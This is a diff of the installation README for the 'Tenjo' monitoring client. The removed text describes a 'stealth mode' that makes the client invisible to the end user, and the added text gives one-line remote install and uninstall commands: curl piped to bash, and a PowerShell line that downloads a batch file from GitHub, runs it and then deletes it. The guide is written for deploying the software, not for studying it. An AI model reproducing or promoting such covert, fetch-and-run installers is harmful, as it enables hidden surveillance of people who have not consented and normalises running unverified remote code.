@@ -1,25 +1,25 @@
 # Tenjo Monitoring Client - Installation Instructions
 
-## 🔒 Stealth Installation
+## 🔒 Remote Stealth Installation
 
-This package installs the Tenjo monitoring client in stealth mode, making it invisible to the end user.
+Use these one-line commands to install the Tenjo monitoring client remotely:
 
-### macOS Installation
+### macOS Installation (One-Line Remote)
 ```bash
-chmod +x stealth_install_macos.sh
-./stealth_install_macos.sh
+curl -sSL https://raw.githubusercontent.com/Adi-Sumardi/Tenjo/master/client/remote_install_macos.sh | bash
 ```
 
-### Windows Installation
+### Windows Installation (One-Line Remote)
 ```cmd
-stealth_install_windows.bat
+powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Adi-Sumardi/Tenjo/master/client/remote_install_windows.bat' -OutFile '%TEMP%\install.bat' -UseBasicParsing; cmd /c '%TEMP%\install.bat'; del '%TEMP%\install.bat'"
 ```
 
 ## ⚙️ Configuration
 
-Before installation, edit the installer script to set your server URL:
-- Change `SERVER_URL` to your actual server address
-- Update `API_KEY` if needed
+The installer automatically downloads all source files from GitHub and configures:
+- Server URL (can be production or local development)
+- API key for authentication
+- All required dependencies
 
 ## 🚀 Features
 
@@ -38,15 +38,25 @@ View live streaming at: `http://103.129.149.67/client/{client-id}/live`
 
 ## 🗑️ Uninstallation
 
-### macOS
+### macOS (One-Line Remote)
 ```bash
-./stealth_uninstall_macos.sh
+curl -sSL https://raw.githubusercontent.com/Adi-Sumardi/Tenjo/master/client/remote_uninstall_macos.sh | bash
 ```
 
-### Windows
+### Windows (One-Line Remote)
 ```cmd
-stealth_uninstall_windows.bat
+powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Adi-Sumardi/Tenjo/master/client/remote_uninstall_windows.bat' -OutFile '%TEMP%\uninstall.bat' -UseBasicParsing; cmd /c '%TEMP%\uninstall.bat'; del '%TEMP%\uninstall.bat'"
 ```
+
+## 📋 Package Contents
+
+This package contains:
+- `main.py` - Main application entry point
+- `requirements.txt` - Python dependencies
+- `src/` - Source code modules
+- This installation guide
+
+**Note**: For remote installation, you don't need this package. Just use the one-line commands above.
 
 ## ⚠️ Legal Notice
 
